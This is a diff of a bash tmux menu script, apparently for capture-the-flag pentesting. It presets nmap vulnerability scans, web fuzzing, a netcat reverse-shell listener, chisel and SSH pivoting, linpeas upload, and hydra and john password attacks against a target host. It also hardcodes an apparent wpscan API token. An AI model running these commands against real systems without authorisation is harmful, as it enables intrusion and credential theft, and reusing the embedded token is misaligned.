@@ -19,22 +19,25 @@ LIGHTCYAN='\033[1;36m'
 WHITE='\033[1;37m'
 
 LHOST=10.9.233.39
+CTF_HOST=
+
 EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml
+STATUS_CODE=200,204,301,302,307,401,405 # remove 403
 
 COMMAND_2='Serve tools'
 COMMAND_3='Upload handyman'
 COMMAND_4="Remove entry from /etc/hosts"
-COMMAND_5="sudo bash -c \"echo 'HOSTNAME $RHOST' >> /etc/hosts\""
 
-COMMAND_e1='rustscan --accessible --ulimit 5000 -a $RHOST -- -sV -sC | tee -i scan.txt | highlight "^\d+\/tcp"'
-COMMAND_e2='nmap -sV -sC $RHOST | highlight "^\d+\/tcp"'
-COMMAND_e3='ffuf -v -c -recursion -t 64 -o ffuf.txt -e $EXTS -w "$W_COMMON" -u http://$RHOST/FUZZ'
-COMMAND_e4='gobuster dir -e -l -t 64 -w "$W_COMMON" -x $EXTS -u http://$RHOST | highlight "200|30[12]"'
-COMMAND_e5='whatweb -v $RHOST'
+COMMAND_e1='rustscan --accessible --ulimit 5000 -a $RHOST -- -Pn -sV -sC | tee -i nmap-scan.txt | highlight "^\d+\/tcp"'
+COMMAND_e2='nmap -Pn -sV -oN nmap-vuln.txt --script vuln $RHOST | highlight "CVE-\d*-\d*"'
+COMMAND_e3='ffuf -v -c -recursion -t 64 -o ffuf.txt -mc=$STATUS_CODE -e $EXTS -w "$W_COMMON" -u http://$RHOST/FUZZ'
+COMMAND_e4='whatweb -v $RHOST'
+COMMAND_e5='wpscan --api-token G8ifDn8HmQOCnzEB9Z7i9NkJDX9cGvfmPPbOdxTXNFk -v -o wpscan.txt --url http://$RHOST'
 
 COMMAND_n1='nc -nlvp 4444'
 COMMAND_n2='ssh $USER@$RHOST -p 22'
 COMMAND_n3='chisel server -p 9999 --reverse -v'
+COMMAND_n4='ssh -i id_rsa USER@$RHOST -D 9050 -N -f'
 
 COMMAND_u1='scp ~/Tools/linpeas.sh $USER@$RHOST:/tmp'
 COMMAND_u2='scp ~/Tools/chisel $USER@$RHOST:/tmp'
@@ -43,7 +46,7 @@ COMMAND_b1='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST ssh -
 COMMAND_b2='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
 COMMAND_b3='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$RHOST/login.php -d "key=FUZZ"'
 COMMAND_b4='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
-COMMAND_b5='python /usr/share/john/ssh2john.py key > key.hash'
+COMMAND_b5='python2 /usr/share/john/ssh2john.py id_rsa > key.hash'
 COMMAND_b6='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'
 
 COMMAND_d1='binwalk -e file.jpg'
@@ -73,11 +76,10 @@ show_menus() {
   echo -e "  ${YELLOW}2${NOCOLOR}) $COMMAND_2"
   echo -e "  ${YELLOW}3${NOCOLOR}) $COMMAND_3"
   echo -e "  ${YELLOW}4${NOCOLOR}) $COMMAND_4"
-  echo -e "  ${YELLOW}5${NOCOLOR}) $COMMAND_5"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Enumeration${NOCOLOR}"
   echo -e "  -------------"
-  echo -e "  ${YELLOW}e1${NOCOLOR}) $COMMAND_e1"
+  echo -e "  ${YELLOW}e1${NOCOLOR}) $COMMAND_e1 (${YELLOW}e11${NOCOLOR} for output)"
   echo -e "  ${YELLOW}e2${NOCOLOR}) $COMMAND_e2"
   echo -e "  ${YELLOW}e3${NOCOLOR}) $COMMAND_e3"
   echo -e "  ${YELLOW}e4${NOCOLOR}) $COMMAND_e4"
@@ -88,6 +90,7 @@ show_menus() {
   echo -e "  ${YELLOW}n1${NOCOLOR}) $COMMAND_n1"
   echo -e "  ${YELLOW}n2${NOCOLOR}) $COMMAND_n2"
   echo -e "  ${YELLOW}n3${NOCOLOR}) $COMMAND_n3"
+  echo -e "  ${YELLOW}n4${NOCOLOR}) $COMMAND_n4"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Upload${NOCOLOR}"
   echo -e "  ------"
@@ -101,6 +104,7 @@ show_menus() {
   echo -e "  ${YELLOW}b3${NOCOLOR}) $COMMAND_b3"
   echo -e "  ${YELLOW}b4${NOCOLOR}) $COMMAND_b4"
   echo -e "  ${YELLOW}b5${NOCOLOR}) $COMMAND_b5"
+  echo -e "  ${YELLOW}b6${NOCOLOR}) $COMMAND_b6"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Decoding/Extracting${NOCOLOR}"
   echo -e "  --------------------"
@@ -124,8 +128,27 @@ show_menus() {
   echo -e "  ${YELLOW}c7${NOCOLOR}) $CLIP_7"
   echo -e "  ${YELLOW}c8${NOCOLOR}) $CLIP_8"
   echo -e ""
+  echo -e "  (${YELLOW}o${NOCOLOR})pen. Open split"
   echo -e "  e(${RED}x${NOCOLOR})it. Exit"
   echo -e ""
+}
+
+setTmuxEnv () {
+  tmux setenv LHOST $LHOST
+  tmux setenv RHOST $RHOST
+  tmux setenv USER $USER
+  tmux setenv CTF_HOST $CTF_HOST
+}
+
+openSplit() {
+  setTmuxEnv
+
+  tmux split-window -v
+  sleep 0.1
+}
+
+openLink() {
+  xdg-open $1
 }
 
 exportRHOST() {
@@ -139,8 +162,7 @@ exportRHOST() {
     tmux send-keys "$0" ENTER
   else
     if [ $1 = 1 ]; then
-      tmux split-window -v
-      sleep 0.1
+      openSplit
 
       tmux send-keys "export RHOST="
     fi
@@ -154,12 +176,7 @@ exportLHOST() {
 }
 
 runServeTools() {
-  tmux setenv LHOST $LHOST
-  tmux setenv RHOST $RHOST
-  tmux setenv USER $USER
-
-  tmux split-window -v
-  sleep 0.1
+  openSplit
 
   # Setup handyman with correct LHOST
   tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" ENTER
@@ -175,12 +192,7 @@ runServeTools() {
 }
 
 runUploadHandyman() {
-  tmux setenv LHOST $LHOST
-  tmux setenv RHOST $RHOST
-  tmux setenv USER $USER
-
-  tmux split-window -v
-  sleep 0.1
+  openSplit
 
   tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" ENTER
   sleep 0.1
@@ -192,24 +204,38 @@ runUploadHandyman() {
 }
 
 runV() {
-  tmux setenv LHOST $LHOST
-  tmux setenv RHOST $RHOST
-  tmux setenv USER $USER
+  openSplit
 
-  tmux split-window -v
-  sleep 0.1
   C="$@"
   tmux send-keys "$C"
 }
 
-openLink() {
-  xdg-open $1
+runCat () {
+  openSplit
+
+  C=''
+
+  case $1 in
+    e1) C="cat nmap-scan.txt | highlight \"^\d+\/tcp\"";;
+    e2) C="cat nmap-vuln.txt | highlight \"CVE-\d*-\d*\"";;
+    e5) C="cat wpscan.txt | highlight \"CVE-\d*-\d*\"";;
+  esac
+
+  tmux send-keys "$C" Enter
 }
 
 runC() {
   echo "$@" | xclip -sel c
 
   echo "COPIED!"
+}
+
+addEtcHosts() {
+  export CTF_HOST=$1
+
+  sudo bash -c "echo '$RHOST $CTF_HOST' >> /etc/hosts"
+
+  xdg-open "http://$CTF_HOST"
 }
 
 removeEtcHosts() {
@@ -231,17 +257,20 @@ read_options() {
     2) runServeTools;;
     3) runUploadHandyman;;
     4) removeEtcHosts;;
-    5) runV $COMMAND_5;;
 
     e1) runV $COMMAND_e1;;
+    e11) runCat 'e1';;
     e2) runV $COMMAND_e2;;
+    e22) runCat 'e2';;
     e3) runV $COMMAND_e3;;
     e4) runV $COMMAND_e4;;
     e5) runV $COMMAND_e5;;
+    e55) runCat 'e5';;
 
     n1) runV $COMMAND_n1;;
     n2) runV $COMMAND_n2;;
     n3) runV $COMMAND_n3;;
+    n4) runV $COMMAND_n4;;
 
     u1) runV $COMMAND_u1;;
     u2) runV $COMMAND_u2;;
@@ -251,6 +280,7 @@ read_options() {
     b3) runV $COMMAND_b3;;
     b4) runV $COMMAND_b4;;
     b5) runV $COMMAND_b5;;
+    b6) runV $COMMAND_b6;;
 
     d1) runV $COMMAND_d1;;
     d2) runV $COMMAND_d2;;
@@ -268,6 +298,8 @@ read_options() {
     c7) runC $CLIP_7;;
     c8) runC $CLIP_8;;
 
+    o) openSplit;;
+    open) openSplit;;
     x) runExit;;
     exit) runExit;;
   esac
@@ -281,8 +313,12 @@ do_menu() {
   done
 }
 
+# if [ ! -z "$1" ]; then
+#   exportLHOST $1
+# fi
+
 if [ ! -z "$1" ]; then
-  exportLHOST $1
+  addEtcHosts $1
 fi
 
 do_menu
